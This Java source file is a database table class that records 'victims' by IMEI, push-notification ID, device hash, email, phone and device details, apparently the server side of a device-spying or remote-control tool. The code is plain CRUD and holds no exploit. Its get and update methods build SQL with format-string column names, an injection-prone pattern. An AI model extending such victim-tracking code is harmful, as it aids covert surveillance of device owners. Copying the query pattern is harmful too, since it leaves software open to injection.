package com.theah64.xrob.api.database.tables;

import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.Victim;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;

/**
 * Created by theapache64 on 11/22/2015.
 */
public class Victims extends BaseTable<Victim> {

    public static final String COLUMN_IMEI = "imei";
    public static final String COLUMN_FCM_ID = "fcm_id";
    public static final java.lang.String COLUMN_API_KEY = "api_key";
    private static final String TABLE_VICTIMS = "victims";
    public static final String COLUMN_EMAIL = "email";
    public static final String COLUMN_PHONE = "phone";
    private static final String COLUMN_FCM_UPDATED_AT = "fcm_updated_at";
    public static final String COLUMN_DEVICE_HASH = "device_hash";
    public static final String COLUMN_DEVICE_NAME = "device_name";
    public static final String COLUMN_OTHER_DEVICE_INFO = "other_device_info";
    public static final String COLUMN_VICTIM_CODE = "victim_code";

    private Victims() {
    }

    private static final Victims instance = new Victims();

    public static Victims getInstance() {
        return instance;
    }

    @Override
    public Victim get(String byColumn, String byValue) {

        final String query = String.format("SELECT id,name,email,phone,api_key,fcm_id,device_name FROM victims WHERE %s = ? LIMIT 1", byColumn);

        final java.sql.Connection connection = Connection.getConnection();
        Victim victim = null;

        try {

            final PreparedStatement ps = connection.prepareStatement(query);
            ps.setString(1, byValue);

            final ResultSet rs = ps.executeQuery();

            if (rs.next()) {
                //Collecting victim
                final String id = rs.getString(COLUMN_ID);
                final String name = rs.getString(COLUMN_NAME);
                final String phone = rs.getString(COLUMN_PHONE);
                final String email = rs.getString(COLUMN_EMAIL);
                final String apiKey = rs.getString(COLUMN_API_KEY);
                final String fcmId = rs.getString(COLUMN_FCM_ID);
                final String deviceName = rs.getString(COLUMN_DEVICE_NAME);

                victim = new Victim(id, name, email, phone, null, null, apiKey, fcmId, deviceName, null, null, null, false, null);
            }

            rs.close();
            ps.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                connection.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return victim;
    }

    /**
     * Used to add new victim to the database
     * null, name, email, phone, imei, deviceHash, apiKey, fcmId, deviceName, otherDeviceInfo, null, null, true
     */
    @Override
    public boolean add(Victim victim) {

        final String addVictimQuery = "INSERT INTO victims (name,email,phone,imei,device_hash,api_key,fcm_id,device_name,other_device_info,victim_code) VALUES (?,?,?,?,?,?,?,?,?,?);";
        final java.sql.Connection connection = Connection.getConnection();

        //To track the success
        boolean isVictimAdded = false;

        try {
            final PreparedStatement ps = connection.prepareStatement(addVictimQuery);

            ps.setString(1, victim.getName());
            ps.setString(2, victim.getEmail());
            ps.setString(3, victim.getPhone());
            ps.setString(4, victim.getIMEI());

            ps.setString(5, victim.getDeviceHash());
            ps.setString(6, victim.getApiKey());
            ps.setString(7, victim.getFCMId());
            ps.setString(8, victim.getDeviceName());
            ps.setString(9, victim.getOtherDeviceInfo());
            ps.setString(10, victim.getVictimCode());

            isVictimAdded = ps.executeUpdate() == 1;

            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                connection.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return isVictimAdded;
    }

    @Override
    public void addv2(Victim victim) throws RuntimeException {
        if (!add(victim)) {
            throw new RuntimeException("Unexpected error while adding new victim");
        }
    }

    /**
     * Used to get a specific column by the {byColumn} and {byValue}
     */
    @Override
    public String get(String byColumn, String byValue, String columnToReturn) {
        return super.getV2(TABLE_VICTIMS, byColumn, byValue, columnToReturn);
    }

    @Override
    public boolean update(String whereColumn, String whereColumnValue, String updateColumn, String newUpdateColumnValue) {

        String queryFormat = "UPDATE victims SET %s = ? ";
        if (updateColumn.equals(COLUMN_FCM_ID)) {
            queryFormat += ", fcm_updated_at = NOW() ";
        }
        queryFormat += "WHERE %s = ?";

        final String query = String.format(queryFormat, updateColumn, whereColumn);

        boolean isVictimUpdated = false;
        final java.sql.Connection connection = Connection.getConnection();


        try {
            final PreparedStatement ps = connection.prepareStatement(query);
            ps.setString(1, newUpdateColumnValue);
            ps.setString(2, whereColumnValue);
            isVictimUpdated = ps.executeUpdate() == 1;
            ps.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                connection.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return isVictimUpdated;
    }


}
